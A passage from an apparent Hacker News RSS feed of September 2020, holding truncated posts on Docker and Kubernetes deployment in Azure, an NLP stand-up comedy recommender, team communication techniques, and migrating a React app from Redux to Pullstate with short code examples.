definition</p><h2>Getting Started With Containers</h2><p>As high-level virtualization technology, containers provide an isolated and independent environment. Containers such as Docker perform the virtualization of the operating system as well as the related infrastructure. Docker enforces the portability and agility of applications and acts as a deployment unit while deploying multiple containers clusters.</p><h3>Docker Architecture</h3><p>Docker uses a client-server architecture and can be built into three essential parts: the Docker client, the Docker host with Docker daemon and Docker registry within the architecture.</p><ul><li>Docker Client where Docker environments should be installed to build Docker images with a target application.</li><li>Docker Host is a managed host with Docker daemon (also known as Dockerd which is the persistent process that manages containers).</li><li>Docker Registry provides or stores different Docker images. The best known open communities for Docker images are Docker hub, nginx (the official Docker image) and the Docker store.</li></ul><p>The Docker client can communicate with Docker daemon by using the RESTful API over UNIX sockets or a network interface in two ways:</p><ul><li>Docker clients can run on the same system with Docker daemon.</li><li>Docker clients connect to a remote Docker daemon.</li></ul><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f09e4281874_Screen-Shot-2018-06-13-at-19.12.20.png"></p></figure><p>Docker architecture</p><p>Other important Docker related tools are:</p><p>Docker Compose is a tool used to define and run multi-container Docker applications. A configuration file in YAML format is used to configure your application‚Äôs services.</p><p>A DockFile is necessary to define what will be added in the Docker container, then paired with the Docker command to build a Docker image and pull the image to the Docker registry.</p><h3>Docker on Azure</h3><p>Microsoft Azure provides the Azure Container Service (ACS) to secure and manage enterprise container apps in the cloud and an Azure Container Registry (ACR) to manage Docker images which are controlled by Azure AD. Azure also provides Azure Container Instances (ACI) which offers a more simple, faster way to run a container in Azure without thinking about the infrastructure level.</p><p>Microsoft also provides some useful tools while working with Docker in Azure such as Virtual Studio online, Visual Studio code, and the Visual Studio extension Docker.</p><h3>Container-clustering Solutions in Azure</h3><p>To run an application with more than 100 instances to act as container clusters, there are a couple of container orchestrators which simplify the management of container clusters.</p><p>The open-source container orchestrators are popular in the market such as Docker Swarm, Kubernetes, and Marathon of Mesosphere‚Äôs DC/OS (which is designed for big data analytics solution and facilities to deploy Hadoop clusters, OpenShift, Rancher, CoreOS Tectonic, Docker EE and others).</p><h3>Kubernetes in Azure</h3><p>As time goes by, I think that Kubernetes is winning the competition between container orchestrators for many reasons. Microsoft Azure has also launched a service currently in preview mode, Azure Kubernetes Service (AKS). Microsoft considers Kubernetes the best balance between function and performance. It applies master/slave architecture which is a model of communication where one device or process acts as the master to control one or more other devices (slave). It facilitates the deployment of microservices while each node should scale and work independently.</p><p>Microsoft recommends deploying multiple masters (generally three nodes as master node) in Azure, then balances the number of slave nodes depending on the scenario. If you‚Äôre working with Microsoft Azure and need to deploy clusters with master/slave architecture, you can check my <a href="https://github.com/cloudmelon/azure-multiple-vmss-linux" target="_blank" data-rt-link-type="external">GitHub repository</a> where you can find some useful ARMs (Azure Resource Manager) templates.</p><p>Microsoft Azure also provides a container service known as Azure Container Services. It implements the popular container orchestrators managed by Kubernetes in Azure, and it offers many useful features such as:</p><ul><li>Easy management of containers even when there are more than 100 instances.</li><li>Easy scaling.</li><li>Support popular operating systems such as Linux and Windows.</li><li>Easy roll-out and rollback.</li><li>Can combine with batch processing or cron jobs.</li><li>Automatic bin packing (e.g., depends on GPU/CPU usage).</li></ul><p>In the Azure Marketplace, a standard/advanced version of Docker EE for Azure is available so users can deploy Docker directly in Azure. There are options such as Mesos (DC/OS on Azure) for the same purpose.</p><h3>Reference Deployment Methods</h3><p>To improve the resilience of the applications that we‚Äôve deployed with container-clustering solutions, I‚Äôd like to recommend several deployment methods.</p><h3>Blue/Green Deployment</h3><p>Blue/Green deployments, also known as B/G deployments or Red/Black deployments. The main principle is to deploy two identical environments which are configured in the same way. Generally, while one environment is live and in use by users, the other environment stays idle. When downtime occurs, this architecture allows to redirect the incoming traffic to the idle configuration which runs the original version with the help of load balancer. The target is to reduce downtime during production deployments.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497c5e626f2387281875_BG-Deployment.png"></p></figure><h3>Canary Release</h3><p>In this method ‚Äì which is typically used in production without impacting the current version ‚Äì the implementation is similar to B/G deployment by deploying the latest version of the application into production which acts as a ‚Äòcanary.‚Äô This version integrates with other apps and every infrastructure environment to simulate what it will look like in the real production, but to which no public users are routed at the moment. After that, all related influencers feel satisfied with the new version, more servers will be released and more users will be routed to the new version. Remember to implement a safety rollback strategy in case of any issue detected in the future.</p><figure data-rt-type="image" data-rt-align="center"><p><img src="https://assets.website-files.com/5d514fd9493b0575f03520bd/5d66497cf0c4151b513deec5_canary-release.jpeg"></p></figure><p>Canary release</p><h3>Recommended Deployment Tools</h3><p>Infrastructure as code software such as TerraForm would be a great choice to manage the high-level configuration. It creates files with a .tf extension and the content in YAML format.</p><p>The command you need to apply to all your configurations is terraform apply.</p><h2>Conclusion</h2><p>Digital transformations ‚Äì when transitioning from on-premise to the cloud ‚Äì DevOps, ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.datree.io/resources/devops-containers-kubernetes">https://www.datree.io/resources/devops-containers-kubernetes</a></em></p>]]>
            </description>
            <link>https://www.datree.io/resources/devops-containers-kubernetes</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585356</guid>
            <pubDate>Fri, 25 Sep 2020 00:47:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recommender Systems Are a Joke ‚Äì Unsupervised Learning with Stand-Up Comedy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585210">thread link</a>) | @sebg
<br/>
September 24, 2020 | https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/ | <a href="https://web.archive.org/web/*/https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
  
  <time datetime="2020-09-18T00:00:00+00:00">18 Sep 2020</time>
  <p><em>Disclaimer: This post as well as the code accompanying it contains some direct and indirect references to potentially 
offensive language. This is an analysis of stand-up comedy, which tends to contain curse words, racial slurs, etc. 
However, all references are made with objective, academic intent. If you have any concerns with my treatment of 
certain language, I‚Äôd be happy to have a conversation. You can get in touch with me via <a href="https://www.linkedin.com/in/kaplanstephen/" target="_blank">LinkedIn</a>.</em></p>

<p>This post documents my first foray into unsupervised learning, natural language processing, and 
recommender systems. I completed this project over a 2-week span during my time as a student at
<a href="https://thisismetis.com/" target="_blank">Metis</a>.</p>

<p>The code for this project can be found <a href="https://github.com/stephenjkaplan/standup-comedy-recommender" target="_blank">here</a>.
The Flask app I made for this project can be found <a href="https://standup-comedy-recommender.herokuapp.com/" target="_blank">here</a>.</p>

<h3 id="intro">Intro</h3>

<p><img src="https://stephenjkaplan.github.io/images/2020-09-18/comedy.jpg" alt="Comedy">
<small>Comedy! (Image: <a href="https://scrapsfromtheloft.com/stand-up-comedy-scripts/">Scraps from the Loft</a>)</small></p>

<p>A little over halfway through the Metis data science bootcamp, the curriculum shifted from 
<a href="https://en.wikipedia.org/wiki/Supervised_learning" target="_blank">supervised</a> to 
<a href="https://en.wikipedia.org/wiki/Unsupervised_learning" target="_blank">unsupervised</a> learning. At that point, my brain was<br>
firmly in ‚Äúpredict y given X‚Äù mode, and it quite honestly took a few days to wrap my head around what it means 
to use machine learning on unlabeled data, and why that would even be useful. It clicked when I applied a 
rudimentary model of the human brain to both of these approaches: often our brains make inferences based 
on our previous experiences and knowledge (supervised learning). However, sometimes we are forced to find previously 
unseen patterns in the world around us (unsupervised learning) before we can make decisions.</p>

<p>Concurrently, we were introduced to 
<a href="https://en.wikipedia.org/wiki/Natural_language_processing" target="_blank">Natural Language Processing</a> (NLP). In addition 
to learning a lot specifically about NLP, one big takeaway was a clearer understanding of what is meant by
‚ÄúArtificial Intelligence‚Äù in the context of machine learning - any instance 
of a computer being able to imitate (or even replicate) a human perception or ability. After this realization, 
I went from being somewhat weary of apply machine learning to text/speech, to extremely motivated to 
work on an NLP problem.</p>

<p>As you might expect, the main requirements of this project were:</p>
<ol>
  <li>Use unsupervised learning.</li>
  <li>Use text as the primary data source.</li>
</ol>

<p>I almost instantly came up with an idea. Stand-up comedy specials are usually in a 1-hour monologue 
format, and are rich and diverse in topics, opinions, colloquialisms, and regional english dialects.
For that reason, and also the fact that I‚Äôm a huge fan of the comedy world, I knew that this would be
a stimulating project.</p>

<h3 id="data-wrangling">Data Wrangling</h3>

<p>Luckily, I was able to quickly find a website 
(<a href="https://scrapsfromtheloft.com/stand-up-comedy-scripts/" target="_blank">Scraps from the Loft</a>) with several hundred 
comedy transcripts. I used the Python <a href="https://requests.readthedocs.io/en/master/" target="_blank">requests</a>) library 
in a <a href="https://github.com/stephenjkaplan/standup-comedy-recommender/blob/master/analysis/data_acquisition.py" target="_blank">script</a> to acquire all of the raw HTML for each transcript, and 
<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/" target="_blank">Beautiful Soup</a> to parse the main text and 
various metadata (comedian, title of comedy special, year).</p>

<p>After inserting the data into pandas dataframes (one for the metadata and one for the text corpus), I stored 
it in a remote <a href="https://www.mongodb.com/" target="_blank">Mongo</a> database on an Amazon AWS EC2 instance. Admittedly, 
this wasn‚Äôt really necessary as my corpus was small enough to store locally , but I wanted to get more comfortable with 
both creating MongoDB collections and querying data for analysis and modeling using 
<a href="https://pymongo.readthedocs.io/en/stable/" target="_blank">pymongo</a>.</p>

<h3 id="data-cleaning--the-nlp-pipeline">Data Cleaning &amp; The NLP Pipeline</h3>

<p>As we had been warned, cleaning and preparing the text corpus proved to be the most critical, time 
consuming part of this project. Topic modeling (and clustering) of text data relies on sufficient elimination 
of extraneous words, but also careful inclusion of words that might be indicators of a topic.</p>

<p>First, I performed some ‚Äúmacro‚Äù cleaning, removing entire documents (individual transcripts) that would 
throw off the modeling and/or not be relevant in a recommender app. That involved removing:</p>
<ul>
  <li>Comedy specials in different languages (there were a handful in Italian and Spanish).</li>
  <li>Comedy specials that are not widely available (or available at all) on streaming platforms.</li>
  <li>Short-form comedy such as <a href="https://www.youtube.com/watch?v=--IS0XiNdpk" target="_blank">monologues on Saturday Night Live</a>, 
or other late night TV shows.</li>
</ul>

<p>I then created an ‚Äú<a href="https://github.com/stephenjkaplan/standup-comedy-recommender/blob/master/app/nlp_pipeline.py" target="_blank">NLP pipeline</a>‚Äù, 
that can take any document from the corpus and perform the following transformations:</p>
<ul>
  <li>Clean the text by removing punctuation, non-essential parts like the person introducing the comedian, 
removing numbers, removing line breaks, crazy noises and expressions like ‚Äúaaaaah‚Äù, and common English 
<a href="https://en.wikipedia.org/wiki/Stop_word" target="_blank">stop words</a>.</li>
  <li>‚ÄúLemmatized‚Äù words to reduce all forms of words to their base or ‚Äúlemma‚Äù. (For example, ‚Äústudies‚Äù and 
 ‚Äústudying‚Äù become ‚Äústudy‚Äù). The purpose of this is to extract the core meaning and topics out of the text 
 rather than pay attention to how words are being used in the context of a sentence. The Python <a href="https://www.nltk.org/" target="_blank">NLTK</a> library 
 was very useful for this step and several of the previous steps.</li>
  <li>‚ÄúVectorized‚Äù the entire corpus. In general, this means converting the long strings of text to tabular format, 
 where each column is a word, each row represents a document in the corpus (also known as a 
 <a href="https://en.wikipedia.org/wiki/Document-term_matrix" target="_blank">doc-term matrix</a>), and each cell 
 contains a numerical representation of the words frequency of use or some other metric.</li>
</ul>

<p><img src="https://stephenjkaplan.github.io/images/2020-09-18/cleaning.png" alt="cleaning">
<small>Summary of text cleaning steps.</small></p>

<p>The final data format is ‚Äúfit‚Äù on the initial dataset, and then applied to any incoming data (as is the case with 
the <a href="#search-engine-recommender-with-content-based-filtering">search engine feature</a> described later in this post.)</p>

<p>To elaborate a bit on vectorization: I focused on trying out two <a href="https://scikit-learn.org/stable/modules/classes.html#module-sklearn.feature_extraction.text" target="_blank">types/implementations of vectorization in 
scikit-learn</a>:</p>
<ol>
  <li><a href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.CountVectorizer.html#sklearn.feature_extraction.text.CountVectorizer" target="_blank">Count Vectorizer</a>,
which simply counts the frequency of each word in each document/transcript.</li>
  <li><a href="https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.TfidfVectorizer.html#sklearn.feature_extraction.text.TfidfVectorizer" target="_blank">TF-IDF Vectorizer</a>,
which calculates the product of term frequency with its inverse-document frequency (a scale of 0 to 1 where values 
closer to zero are common in the entire dataset of transcripts). This is a valuable metric because it weights 
words that are common in a document more heavily if they aren‚Äôt common in general, which is a useful tool for 
ultimately extracting distinct topics.</li>
</ol>

<p>In general, creating this pipeline was an iterative process. I tried out different transformations and did 
topic modeling (explained in the next section) to evaluate the effectiveness of different components in the pipeline. 
This helped inform my decision to vectorize the text with <strong>TF-IDF</strong>, as it yielded topics that were much 
more discernible and easy to label by looking at each topic‚Äôs top words.</p>

<p>One other note important note is that using pre-built lists of common English stop words to remove from the 
dataset isn‚Äôt a complete solution. I had to do quite a bit of combing through the transcripts to identify 
insignificant, yet common words and manually add them to the stop words list. It may come as no surprise that 
curse words are extremely prevalent in comedy, and don‚Äôt usually add much meaning, so I had to include some 
pretty aggressive words in my code (several of which are fairly offensive and I wouldn‚Äôt use in conversation).</p>

<p>Aside from also removing names/other irrelevant proper nouns, I also had to carefully decide what to do about racial slurs.
Like it or not, racial slurs are common in stand-up comedy and can sometimes carry important meaning with regards to a 
comedian‚Äôs jokes. As a result, I left many of them in the dataset, but was also tasked with the uncomfortable task of 
hard-coding some extremely antiquated language in the NLP pipeline class for removal.</p>

<h3 id="modeling--flask-app-features">Modeling &amp; Flask App Features</h3>

<p>My main objective for this project was to develop a Flask application that provided more nuanced 
recommendations of comedy specials than what‚Äôs currently available on mainstream streaming platforms. I scoped 
out two features:</p>

<ol>
  <li>A dropdown genre filter using genres that were created by machine learning algorithms (as opposed to 
human labeling.)</li>
  <li>A search bar that allows a user to describe the comedy they want to see, and get content-based 
recommendations.</li>
</ol>

<p>You can play around with the app <a href="https://standup-comedy-recommender.herokuapp.com/" target="_blank">here</a>.</p>

<h4 id="automatic-genre-filters-with-topic-modeling">Automatic Genre Filters with Topic Modeling</h4>

<p>Creating machine-learned genres involves first applying the unsupervised learning technique of 
<a href="https://en.wikipedia.org/wiki/Topic_model" target="_blank">topic modeling</a>, transforming the resulting 
data to extract which words are most closely related with each topic, and then performing the manual task 
of giving each topic a reasonable label.</p>

<p>In relatively simple terms, topic modeling involves reducing the dimensions of the document-term matrix (words) to a specified number 
of columns (representing the topics, and a weighting for each topic to each document). I tried a few different dimensionality reduction techniques including 
<a href="https://en.wikipedia.org/wiki/Latent_semantic_analysis" target="_blank">Latent Semantic Analysis</a> (LSA), 
<a href="https://en.wikipedia.org/wiki/Latent_Dirichlet_allocation" target="_blank">Latent Dirichlet Allocation</a> (LDA), and 
<a href="https://en.wikipedia.org/wiki/Non-negative_matrix_factorization" target="_blank">Non-Negative Matrix Factorization</a> (NMF). 
Ultimately, the 
<a href="https://scikit-learn.org/stable/modules/generated/sklearn.decomposition.NMF.html" target="_blank">scikit-learn implementation of NMF</a>
yielded the most discernible topics.</p>

<p><img src="https://stephenjkaplan.github.io/images/2020-09-18/topics.png" alt="topics">
<small>Examples of top words associated with modeled topics.</small></p>

<p>Based on the top words generated from each topic, I used my knowledge of comedy to select the following genres:</p>
<ul>
  <li><strong>Observational</strong>: This is sort of a catch-all for ‚Äúaverage‚Äù, ‚Äúevery day‚Äù topics such as family, chores, marriage, pets, etc. This type of 
 comedy is quite common.</li>
  <li><strong>Immigrant Upbringing</strong>: Many comedians are 1st generation Americans with parents that immigrated to the US and brought their 
culture with them. Comedians with recently immigrated families often talk about the humorous struggles of assimilation, the quirks 
of their various cultures, the pressures of their parents, and hardworking nature of their families.</li>
  <li><strong>Relationships &amp; Sex</strong>: This is another very common topic in comedy, particularly for ‚Äúdirty‚Äù comedians. The sub-topics range 
from dating, to LGBTQ humor, and heavily sexual jokes.</li>
  <li><strong>British/Australian</strong>: This topic was selected almost entirely based on colloquialisms of the comedian. While the United Kingdom 
and Australia have different cultures, they share some slang in common. If I were to continue to spend time on this project, I would 
probably try and separate these two topics, as British comedy historically is associate with a specific type of ‚Äúdry‚Äù humor. That being said,
many non-American english-speaking comedians share a common ‚Ä¶</li></ul></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/">https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/</a></em></p>]]>
            </description>
            <link>https://stephenjkaplan.github.io/2020/09/18/standup-comedy-recommender/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585210</guid>
            <pubDate>Fri, 25 Sep 2020 00:22:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four communication techniques for solving technical problems]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585139">thread link</a>) | @sebg
<br/>
September 24, 2020 | https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/ | <a href="https://web.archive.org/web/*/https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-67">
	<!-- .entry-header -->

	
	
	<div>
		
<p>All data and engineering teams are faced with a constant inflow of organizational, technical, and interpersonal problems and the ability of your team to have business impact will depend largely on how effectively it can move towards optimal solutions to those problems.&nbsp; In this article, I discuss<em> four communication techniques</em> that improve the ability of a team to solve problems.</p>



<figure><img loading="lazy" src="https://documents.app.lucidchart.com/documents/4a162d92-9c91-4478-91b4-b893591b316f/pages/0_0?a=624&amp;x=109&amp;y=38&amp;w=844&amp;h=253&amp;store=1&amp;accept=image%2F*&amp;auth=LCA%2015c6c000cf3d2ca79ca0f2238c9ccfd56666e1b7-ts%3D1600622689" alt="" width="553" height="164"></figure>



<p><strong><em>Work from the problem to the solution:&nbsp; move in the right direction.</em></strong></p>



<p>When presented with a problem, first spend time elucidating the problem space before addressing potential solutions.&nbsp; Interestingly, I think the intuitive and most common approach is to do the opposite: present and advocate for your solution. &nbsp; I think the reason for this is that people tend to assume that others understand the problem as clearly as you do, that you have a full understanding of the problem, and that you understand which aspects of the problem are the most critical to solve for the business.&nbsp; Thus, the only thing that is interesting is the solution you came up with ‚Äì a solution that is either clever or based on your notable experience.&nbsp;</p>



<p>The problem though is that these assumptions are usually wrong.&nbsp; Typically if you spend time first fleshing out the problem, you will realize that other people on the team have context on the problem that you don‚Äôt have.&nbsp; Or that they do not share an understanding of what the problem is or that there is disagreement about what aspects of the problem are the most critical to solve first.&nbsp; Often you will realize that people are focused on solving the technical problem but that they do not have a good understanding of the <em>business </em>problem.&nbsp; It is critical that the business problem is clearly fleshed out before addressing the technical problem.</p>



<p><em>Recommendation.&nbsp; </em>Spend time talking about the problem before anyone presents solutions.&nbsp; It will make sure everyone has the same context.&nbsp; It ensures that the business problem is the focus and that people will agree ‚Äì <em>before presenting their solution ideas</em> ‚Äì which aspects of the problem are the most critical to solve. This process helps remove ego from the conversation, which can develop when a group of smart highly experienced present different solutions that incidentally emphasize different aspects of the problem.&nbsp; Time spent on the problem space consistently will help you identify better solutions, more efficiently, and with less drama.</p>



<figure><img loading="lazy" src="https://documents.app.lucidchart.com/documents/4a162d92-9c91-4478-91b4-b893591b316f/pages/0_0?a=624&amp;x=121&amp;y=330&amp;w=853&amp;h=272&amp;store=1&amp;accept=image%2F*&amp;auth=LCA%2025c83fef8709e6b41929b2f07e7877b84a6ba280-ts%3D1600622689" alt="" width="576" height="183"></figure>



<p><strong><em>Split-tracking ‚Äì prevent circular and chaotic conversations.&nbsp;</em></strong></p>



<p>I have seen a number of conversations about thorny problems go in circles and not only fail to identify good solutions but even make little progress towards a shared understanding of the problem space.&nbsp; How do you prevent this from happening?&nbsp; The primary thing to do is to keep your conversation organized.&nbsp;&nbsp;</p>



<p>One way to do so is to use a technique called <em>split-tracking</em>.&nbsp; Split-tracking is a technique, in which you identify that more than one issue or concern has been raised, bring group awareness to this observation, generate consensus that there is more than one issue at play, and then push others to focus on one issue at a time. &nbsp; Why does this help? &nbsp; People often don‚Äôt realize that they are conflating two issues so they don‚Äôt realize when they are jumping back and forth between these issues.&nbsp; If these issues are not explicitly identified and separated, it can be hard to probe and press a person‚Äôs thinking on an issue ‚Äì they can unconsciously side-step into the second issue. If there are multiple people discussing a problem, it is possible for people to start going in circles if different people re-direct the group to a secondary issue and then another person brings it back to the first issue.&nbsp;&nbsp;</p>



<p><em>Recommendation.&nbsp; </em>Be on the lookout for multiple underlying issues and concerns.&nbsp; If you see them, stop the conversation and say,  ‚ÄúI am hearing two issues here.&nbsp; One is issue $X and other is issues $Y.&nbsp; Which one should we focus on first?‚Äù &nbsp; Make sure other people realize that there are separate issues ‚Äì even if they are correlated ‚Äì and get them to agree to work on them separately.&nbsp; In general, think like a scientist ‚Äì care about the taxonomy of your problem and neatly classify all the sub-problems that exist and their relation to each other (i.e., this is a subproblem of this bigger problem).&nbsp; You can work towards a solution much more effectively, if the problem space is well organized and explicitly understood by everyone in the conversation.&nbsp;</p>



<p><strong><em>Empathy ‚Äì prevent friction and ‚Äúland mines‚Äù from stopping forward progress.</em></strong></p>



<p>Have you ever been in a meeting discussing a problem, making some progress, and then just suddenly had all forward progress come screeching to a halt? &nbsp; Usually this happens when people become defensive or if the conversation triggered an emotional response in someone.&nbsp; How do we prevent this from happening?&nbsp; Although each individual needs to work to keep the bigger picture in mind and to keep their ego out of the conversation, you cannot control other people‚Äôs reactions.&nbsp; So what can you do?&nbsp;</p>



<p><em>Recommendation.&nbsp; </em>Work on being more empathetic in your communication.&nbsp; Carefully consider how others view the problem and how some aspects of the problem may impact them and their work more than you.&nbsp; Consider that even if they have less relevant experience than you, that they still want their viewpoints to be considered and valued.&nbsp; In general, approach people and their thoughts with curiosity.&nbsp; Try to clarify your understanding of their perspective and make it clear that you are spending time trying to understand their views.</p>



<p>If you do this, you will be less likely to trigger an emotional response that will put a lot of friction between you and your solution.&nbsp; You will make people feel heard even if the solution that is ultimately arrived at doesn‚Äôt solve their main pain points. When you approach problems empathetically, it is also easier to build consensus and excitement in the group, which is critical. Identifying the solution is not the final step ‚Äì implementing the solution is, and you want a motivated team to tackle that step.&nbsp;</p>



<p>Emphasizing empathy when working with others has a few other advantages.&nbsp; One, because empathy is driven by curiosity about someone‚Äôs perspective, it makes it easier to identify genuine issues that you hadn‚Äôt been considering previously, thereby enriching your understanding of the problem.&nbsp; Two, it will help you identify nuances in the concerns of others, providing opportunities for split-tracking and organization of the conversation.&nbsp; Three, empathetic communication enhances psychological safety of the group, which in turn means that all people will feel comfortable voicing their concerns and insights. A group that can communicate openly will be better at fleshing out the full problem space and thereby will be better at identifying the optimal solution.&nbsp;&nbsp;&nbsp;</p>



<p>Lastly, I would like to note although people inherently vary in how empathetic they are, it is also a skill that can be cultivated. &nbsp; So make it a mindset that you work actively to engage in.&nbsp; Cultivate your curiosity. If you struggle with it, try meditation. Its core teaching is the power of developing an open loving curiosity about the world.&nbsp; I‚Äôve spent a week in silent meditation, and I can tell you that if you can find the in and out flow of your breath to be fascinating, then it becomes easy to be intrigued by the perspective of your peers.&nbsp;</p>



<figure><img loading="lazy" src="https://ansonwhitmer.com/wp-content/uploads/2020/09/image-1024x299.png" alt="" width="490" height="142" srcset="https://ansonwhitmer.com/wp-content/uploads/2020/09/image-1024x299.png 1024w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image-300x88.png 300w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image-768x224.png 768w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image.png 1138w" sizes="(max-width: 490px) 85vw, 490px"><figcaption>Monitoring ‚Äì keep the conversation within the lines</figcaption></figure>



<p><strong>Monitoring ‚Äì keep the conversation on track</strong></p>



<p>The part of the brain involved in understanding and solving a problem, the dorsolateral prefrontal cortex, is distinct from the part of the brain, the medial prefrontal cortex, that is involved in monitoring your environment and behavior for errors that signal a course correction is needed.&nbsp; I have noticed that leaders, who are great at moving a team towards optimal solutions, are able to keep this monitoring brain area highly activated even as they also help the team move towards a solution.&nbsp; They tend to be constantly scanning the conversation at a meta-level looking for issues that will derail it.&nbsp; So what type of issues are they monitoring for?&nbsp;</p>



<p><em>Establish what you are monitoring for and set the conditions.&nbsp; </em>To know what to monitor for, you first need to clearly identify, at the start of a meeting, what your agenda is and what the basic problem(s) is that you will address.&nbsp; Once there is consensus here, it will be clearer to you if the conversation has moved off track and what you should be monitoring for.&nbsp; Moreover, it also ensures that you have needed conditions for keeping the conversation on track.&nbsp; For example, given your agenda, you should evaluate whether you even have the right decision makers in the room.&nbsp; Do you have unnecessary people who can push the conversation into tangents or are you lacking the needed people so that even if you make a decision, you may not be able to act upon that decision?&nbsp;&nbsp;&nbsp;</p>



<p><em>Conversation below the right level?&nbsp; </em>Is someone ‚Äúgoing into the weeds‚Äù by diving into a technical explanation that isn‚Äôt needed right now? &nbsp; Monitor for this and pull the group out quickly. &nbsp; At best, it is just a waste of time.&nbsp; At worst, it will derail the conversation.&nbsp;</p>



<p><em>Conversation above the right level?&nbsp; </em>Similarly, thoughts can steer the conversation to a level above the agenda.&nbsp; For example, if your company recently switched to a pods organization and there is some question about how to best handle ownership of one line of work in this new pod structure, it can be easy for the conversation to suddenly be about the pods themselves ‚Äì whether they are good and how to change and improve the pods.&nbsp; This level of conversation would be above the one set in your agenda, is not one that you want to or are capable of addressing in your current meeting, and if you even were interested in addressing it, you probably don‚Äôt have the right people in the room to do so.&nbsp; Pull ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/">https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/</a></em></p>]]>
            </description>
            <link>https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585139</guid>
            <pubDate>Fri, 25 Sep 2020 00:10:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating from Redux to Pullstate]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585063">thread link</a>) | @marcusbuffett
<br/>
September 24, 2020 | https://mbuffett.com/posts/redux-to-pullstate/ | <a href="https://web.archive.org/web/*/https://mbuffett.com/posts/redux-to-pullstate/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Recently I migrated my side-project from Redux, which I‚Äôve used in every
React project for the past four years, to
<a href="https://github.com/lostpebble/pullstate">pullstate</a>, here is my tale.</p>
<h2 id="problems-with-redux">Problems with Redux</h2>
<p>Feel free to <a href="#introducing-pullstate">skip this part</a> if you already know the pain points of Redux,
there‚Äôs nothing in here that hasn‚Äôt been discussed a million times before. These
are the problems as I see them, most important first:</p>
<p><strong>The boilerplate</strong>. Oh man, the boilerplate. Want to add a counter? First, add
the field to your interface (I‚Äôm assuming TypeScript), add a default value,
create a new action type for the incrementing, write an action
creator, add the case to your reducer, add the dispatcher hook to your
component, dispatch your action creator. It‚Äôs exhausting just to list the
steps, nevermind actually doing it for every bit of state you need to keep track
of.</p>
<p><strong>Type-safety</strong>. Despite some valiant efforts to strong-arm the TypeScript
type system to work with a stringly-typed API like Redux, the state of the art
is still sorely lacking. If you go through all the hoops, you can get
type-checking, at the expense of even more boilerplate.</p>
<p><strong>Locality</strong>. I could go on a longer rant about the trade-off between de-coupling
and locality, I‚Äôll keep it to Redux. The symptom of the problem is that this:</p>
<div><pre><code data-lang="jsx">&lt;<span>div</span>
  <span>onClick</span><span>=</span>{() =&gt; {
    <span>state</span>.<span>counter</span><span>++</span>;
  }}
/&gt;
</code></pre></div><p>Which is easy to read, turns into this:</p>
<div><pre><code data-lang="jsx"><span>// component.tsx
</span><span></span>&lt;<span>div</span>
  <span>onClick</span><span>=</span>{() =&gt; {
    <span>dispatch</span>(<span>incrementCounter</span>());
  }}
/&gt;;
<span>// actionCreators.ts
</span><span></span><span>export</span> <span>const</span> <span>incrementCounter</span> <span>=</span> () =&gt; {
  <span>return</span> {
    <span>type</span><span>:</span> <span>AppAction</span>.<span>IncrementCounter</span>,
  };
};
<span>// reducer.ts
</span><span></span><span>export</span> <span>const</span> <span>reducer</span> <span>=</span> (<span>state</span><span>:</span> <span>AppState</span>, <span>action</span>) =&gt; {
  <span>// ...
</span><span></span>  <span>if</span> (<span>action</span>.<span>type</span> <span>==</span> <span>AppAction</span>.<span>IncrementCounter</span>) {
    <span>return</span> {
      ...<span>state</span>,
      <span>counter</span><span>:</span> <span>state</span>.<span>counter</span> <span>+</span> <span>1</span>,
    };
  }
  <span>// ...
</span><span></span>};
</code></pre></div><p>This gets described as ‚Äúde-coupling‚Äù, and ‚Äúseparation of concerns‚Äù. I think programmers saw
the MVC pattern and the SOLID principles, then came to the conclusion that
effects happening near their cause is a code smell. This is overly simplistic to
the point of being wrong, and locality as a principle should get way more
respect than it does; there‚Äôs value in having an effect close to its cause.
Locality is the trade-off to de-coupling, and sometimes de-coupling
needs to be called out as what it really is: indirection.</p>
<p>‚ÄúBut what if I‚Äôm doing something more complicated than incrementing a
counter, or want to reuse code? I don‚Äôt want all state logic in my component‚Äù. Functions.
What you‚Äôre looking for are functions.</p>
<p><strong>The mutation trap</strong>. Accidentally mutate your state? Hope you didn‚Äôt need your
UI to update.</p>
<p><strong>The boilerplate</strong>. Did I mention the boilerplate?</p>
<p>Redux has good things too, otherwise I wouldn‚Äôt have used it for the past four
years. It‚Äôs got a huge community, which has created loads of useful libraries.
